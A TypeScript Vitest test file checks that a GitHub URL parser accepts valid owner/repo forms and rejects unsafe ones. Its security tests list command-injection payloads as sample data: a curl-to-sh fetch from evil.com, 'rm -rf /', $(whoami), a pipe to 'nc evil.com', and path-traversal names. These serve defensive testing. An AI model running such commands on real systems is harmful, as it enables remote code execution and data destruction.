import { describe, it, expect } from "vitest";
import { parseGitHubUrl } from "./repo";

describe("parseGitHubUrl", () => {
  it("parses standard GitHub URLs", () => {
    expect(parseGitHubUrl("https://github.com/owner/repo")).toEqual({
      owner: "owner",
      repo: "repo",
      cloneUrl: "https://github.com/owner/repo.git",
    });
  });

  it("accepts shorthand, .git suffix, trailing slash, and tree paths", () => {
    expect(parseGitHubUrl("github.com/pmndrs/zustand").repo).toBe("zustand");
    expect(parseGitHubUrl("https://github.com/owner/repo.git").repo).toBe("repo");
    expect(parseGitHubUrl("https://github.com/owner/repo/").repo).toBe("repo");
    expect(parseGitHubUrl("https://github.com/owner/repo/tree/main").repo).toBe("repo");
  });

  it("accepts the real GitHub identifier charset (dots, hyphens, underscores)", () => {
    const { owner, repo } = parseGitHubUrl("https://github.com/my-org/my.cool_repo");
    expect(owner).toBe("my-org");
    expect(repo).toBe("my.cool_repo");
  });

  // Security: owner/repo flow into git invocations and URLs. The parser is the
  // boundary that must reject shell metacharacters and path traversal.
  it("rejects shell metacharacters (command-injection payloads)", () => {
    const payloads = [
      "github.com/a`curl${IFS}evil.com|sh`b/repo",
      "github.com/owner/repo;rm -rf /",
      "github.com/owner/repo$(whoami)",
      "github.com/own er/repo",
      "github.com/owner/repo|nc evil.com",
      'github.com/owner/repo"&&echo hi',
    ];
    for (const p of payloads) {
      expect(() => parseGitHubUrl(p), p).toThrow(/Invalid GitHub URL/);
    }
  });

  it("rejects path-traversal owner/repo names", () => {
    expect(() => parseGitHubUrl("github.com/../repo")).toThrow(/Invalid GitHub URL/);
    expect(() => parseGitHubUrl("github.com/owner/..")).toThrow(/Invalid GitHub URL/);
  });

  it("rejects non-GitHub hosts", () => {
    expect(() => parseGitHubUrl("https://evil.com/owner/repo")).toThrow(/Invalid GitHub URL/);
    expect(() => parseGitHubUrl("not a url")).toThrow(/Invalid GitHub URL/);
  });
});
